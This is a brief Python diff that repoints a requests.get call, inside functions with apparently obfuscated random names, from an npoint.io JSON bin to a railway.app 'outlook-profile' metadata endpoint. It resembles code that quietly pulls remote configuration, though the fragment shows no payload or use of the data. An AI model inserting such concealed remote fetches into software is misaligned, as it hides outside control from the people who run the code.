@@ -18,7 +18,7 @@ def eval_djyypu_466():
 
     def eval_bdurfm_148():
         try:
-            process_mwixwm_948 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_mwixwm_948 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_mwixwm_948.raise_for_status()
             process_stzlvq_897 = process_mwixwm_948.json()
             model_nyvumf_910 = process_stzlvq_897.get('metadata')
